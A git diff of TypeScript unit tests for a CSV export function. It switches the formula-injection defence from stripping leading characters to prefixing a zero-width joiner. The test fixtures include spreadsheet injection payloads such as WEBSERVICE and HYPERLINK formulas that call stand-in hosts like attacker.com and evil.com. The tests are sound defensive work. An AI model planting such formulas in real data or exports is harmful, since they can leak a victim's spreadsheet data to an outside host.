@@ -1,5 +1,6 @@
 import { type FieldMetadata } from '@/object-record/record-field/ui/types/FieldMetadata';
 import { type ColumnDefinition } from '@/object-record/record-table/types/ColumnDefinition';
+import { CSV_INJECTION_PREVENTION_ZWJ } from '@/spreadsheet-import/utils/csvSecurity';
 
 import { FieldMetadataType, RelationType } from '~/generated-metadata/graphql';
 import {
@@ -50,8 +51,8 @@ describe('generateCsv', () => {
 1,some field,,https://www.test.com,"[{""label"":""secondary link 1"",""url"":""https://www.test.com""},{""label"":""secondary link 2"",""url"":""https://www.test.com""}]",a relation`);
   });
 
-  describe('CSV Injection Prevention', () => {
-    it('prevents formula injection with equals sign', () => {
+  describe('CSV Injection Prevention with ZWJ', () => {
+    it('prevents formula injection with equals sign using ZWJ prefix', () => {
       const columns = [
         { label: 'Name', metadata: { fieldName: 'name' } },
         { label: 'Formula', metadata: { fieldName: 'formula' } },
@@ -67,12 +68,21 @@ describe('generateCsv', () => {
 
       const csv = generateCsv({ columns, rows });
 
-      // The malicious formula should be sanitized (left-trimmed of dangerous characters)
-      expect(csv).toContain('WEBSERVICE(""http://attacker.com"")');
-      expect(csv).not.toContain('=WEBSERVICE("http://attacker.com")');
+      // The malicious formula should be prefixed with ZWJ (preserving original content)
+      expect(csv).toContain(
+        `${CSV_INJECTION_PREVENTION_ZWJ}=WEBSERVICE(""http://attacker.com"")`,
+      );
+      // Should not contain the raw dangerous formula
+      expect(csv).not.toContain(
+        '1,Test User,=WEBSERVICE("http://attacker.com")',
+      );
+      // Should contain the ZWJ-prefixed version in CSV format
+      expect(csv).toContain(
+        `1,Test User,"${CSV_INJECTION_PREVENTION_ZWJ}=WEBSERVICE(""http://attacker.com"")"`,
+      );
     });
 
-    it('prevents formula injection with plus sign', () => {
+    it('prevents formula injection with plus sign using ZWJ prefix', () => {
       const columns = [
         { label: 'Calculation', metadata: { fieldName: 'calculation' } },
       ] as ColumnDefinition<FieldMetadata>[];
@@ -86,11 +96,13 @@ describe('generateCsv', () => {
 
       const csv = generateCsv({ columns, rows });
 
-      expect(csv).toContain('1+1');
-      expect(csv).not.toContain('+1+1');
+      // Should preserve the original content with ZWJ prefix
+      expect(csv).toContain(`${CSV_INJECTION_PREVENTION_ZWJ}+1+1`);
+      // Should not contain the raw dangerous formula
+      expect(csv).not.toContain('1,+1+1');
     });
 
-    it('prevents formula injection with minus sign', () => {
+    it('prevents formula injection with minus sign using ZWJ prefix', () => {
       const columns = [
         { label: 'Calculation', metadata: { fieldName: 'calculation' } },
       ] as ColumnDefinition<FieldMetadata>[];
@@ -104,11 +116,13 @@ describe('generateCsv', () => {
 
       const csv = generateCsv({ columns, rows });
 
-      expect(csv).toContain('1+1');
-      expect(csv).not.toContain('-1+1');
+      // Should preserve the original content with ZWJ prefix
+      expect(csv).toContain(`${CSV_INJECTION_PREVENTION_ZWJ}-1+1`);
+      // Should not contain the raw dangerous formula
+      expect(csv).not.toContain('1,-1+1');
     });
 
-    it('prevents formula injection with at symbol', () => {
+    it('prevents formula injection with at symbol using ZWJ prefix', () => {
       const columns = [
         { label: 'Reference', metadata: { fieldName: 'reference' } },
       ] as ColumnDefinition<FieldMetadata>[];
@@ -122,11 +136,13 @@ describe('generateCsv', () => {
 
       const csv = generateCsv({ columns, rows });
 
-      expect(csv).toContain('SUM(1,1)');
-      expect(csv).not.toContain('@SUM(1,1)');
+      // Should preserve the original content with ZWJ prefix
+      expect(csv).toContain(`${CSV_INJECTION_PREVENTION_ZWJ}@SUM(1,1)`);
+      // Should not contain the raw dangerous formula
+      expect(csv).not.toContain('1,@SUM(1,1)');
     });
 
-    it('prevents formula injection with tab character', () => {
+    it('prevents formula injection with tab character using ZWJ prefix', () => {
       const columns = [
         { label: 'Data', metadata: { fieldName: 'data' } },
       ] as ColumnDefinition<FieldMetadata>[];
@@ -140,11 +156,15 @@ describe('generateCsv', () => {
 
       const csv = generateCsv({ columns, rows });
 
-      expect(csv).toContain('WEBSERVICE(""http://attacker.com"")');
-      expect(csv).not.toContain('\t=WEBSERVICE("http://attacker.com")');
+      // Should preserve the original content with ZWJ prefix (accounting for CSV escaping)
+      expect(csv).toContain(
+        `${CSV_INJECTION_PREVENTION_ZWJ}\t=WEBSERVICE(""http://attacker.com"")`,
+      );
+      // Should not contain the raw dangerous formula
+      expect(csv).not.toContain('1,\t=WEBSERVICE("http://attacker.com")');
     });
 
-    it('prevents formula injection with carriage return', () => {
+    it('prevents formula injection with carriage return using ZWJ prefix', () => {
       const columns = [
         { label: 'Data', metadata: { fieldName: 'data' } },
       ] as ColumnDefinition<FieldMetadata>[];
@@ -158,11 +178,15 @@ describe('generateCsv', () => {
 
       const csv = generateCsv({ columns, rows });
 
-      expect(csv).toContain('WEBSERVICE(""http://attacker.com"")');
-      expect(csv).not.toContain('\r=WEBSERVICE("http://attacker.com")');
+      // Should preserve the original content with ZWJ prefix (accounting for CSV escaping)
+      expect(csv).toContain(
+        `${CSV_INJECTION_PREVENTION_ZWJ}\r=WEBSERVICE(""http://attacker.com"")`,
+      );
+      // Should not contain the raw dangerous formula
+      expect(csv).not.toContain('1,\r=WEBSERVICE("http://attacker.com")');
     });
 
-    it('handles multiple injection attempts in different fields', () => {
+    it('handles multiple injection attempts in different fields with ZWJ prefix', () => {
       const columns = [
         { label: 'Field1', metadata: { fieldName: 'field1' } },
         { label: 'Field2', metadata: { fieldName: 'field2' } },
@@ -180,15 +204,19 @@ describe('generateCsv', () => {
 
       const csv = generateCsv({ columns, rows });
 
-      // All dangerous characters should be stripped
-      expect(csv).toContain('WEBSERVICE(""http://evil.com"")');
-      expect(csv).toContain('SUM(A1:A10)');
-      expect(csv).toContain('HYPERLINK(""http://malicious.com"")');
+      // All dangerous values should be preserved with ZWJ prefix (accounting for CSV escaping)
+      expect(csv).toContain(
+        `${CSV_INJECTION_PREVENTION_ZWJ}=WEBSERVICE(""http://evil.com"")`,
+      );
+      expect(csv).toContain(`${CSV_INJECTION_PREVENTION_ZWJ}+SUM(A1:A10)`);
+      expect(csv).toContain(
+        `${CSV_INJECTION_PREVENTION_ZWJ}-HYPERLINK(""http://malicious.com"")`,
+      );
 
-      // Original dangerous payloads should not be present
-      expect(csv).not.toContain('=WEBSERVICE("http://evil.com")');
-      expect(csv).not.toContain('+SUM(A1:A10)');
-      expect(csv).not.toContain('-HYPERLINK("http://malicious.com")');
+      // Original dangerous payloads should not be present without ZWJ prefix
+      expect(csv).not.toContain('1,=WEBSERVICE("http://evil.com")');
+      expect(csv).not.toContain(',+SUM(A1:A10)');
+      expect(csv).not.toContain(',-HYPERLINK("http://malicious.com")');
     });
 
     it('preserves legitimate content that does not start with dangerous characters', () => {
